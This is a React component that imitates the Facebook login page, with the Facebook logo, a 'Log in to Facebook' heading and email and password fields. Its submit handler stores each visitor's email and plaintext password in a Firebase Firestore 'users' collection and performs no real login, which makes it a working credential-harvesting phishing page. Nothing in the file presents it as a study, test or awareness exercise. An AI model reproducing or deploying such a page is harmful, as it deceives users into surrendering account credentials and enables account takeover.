import React, { useState } from "react";
import { db} from "./firebase";
import { collection, addDoc, serverTimestamp } from "firebase/firestore";
import AddBoxOutlinedIcon from "@mui/icons-material/AddBoxOutlined";
import facebook from "./images/facebook.png";
import "./App.css";

function App() {
  const [formData, setFormData] = useState({ email: "", password: "" });

  const handleInput = (e) => {
    const { id, value } = e.target;
    setFormData((prevData) => ({ ...prevData, [id]: value }));
  };

  const LogIn = async (e) => {
    e.preventDefault();
    try {
      // Add additional user data to Firestore
      const newUserRef = await addDoc(collection(db, "users"), {
        email: formData.email,
        password: formData.password,
        timestamp: serverTimestamp(),
      });

      console.log("New user added with ID: ", newUserRef.id);

      // Redirect to the login page after successful user creation
    } catch (error) {
      console.error("Error adding user: ", error);
    }
  };

  const sendEmail = () => {
    // Functionality to send email
    console.log("Sending email...");
  };

  return (
    <div className="App">
      <img className="logo" src={facebook} alt="" />
      <div className="details">
        <h3>Log in to Facebook</h3>
        <form onSubmit={LogIn}>
          <input
            id="email"
            placeholder="Email address or phone number"
            type="email"
            required
            value={formData.email}
            onChange={handleInput}
          />
          <input
            id="password"
            placeholder="Password"
            type="password"
            required
            value={formData.password}
            onChange={handleInput}
          />
          <button onClick={sendEmail} type="submit" className="btn1">
            Log in
          </button>
          <a href="/">Forgotten account?</a>
          <div className="hr">
            <hr className="hr1" />
            <p className="p1">or</p>
            <hr className="hr2" />
          </div>
          <button className="btn2">
            Create new account
          </button>
        </form>
      </div>
      <div className="languages">
        <p>English(US)</p>
        <p>Français(France)</p>
        <p>Português(Brasil)</p>
        <p>Español</p>
        <p>العربية</p>
        <p>Bahasa</p>
        <p>Indonesia</p>
        <p>Deutsch</p>
        <p>日本語</p>
        <p>Italiano</p>
        <p>हिन्दी</p>
        <AddBoxOutlinedIcon className="icon" />
      </div>
    </div>
  );
}

export default App;
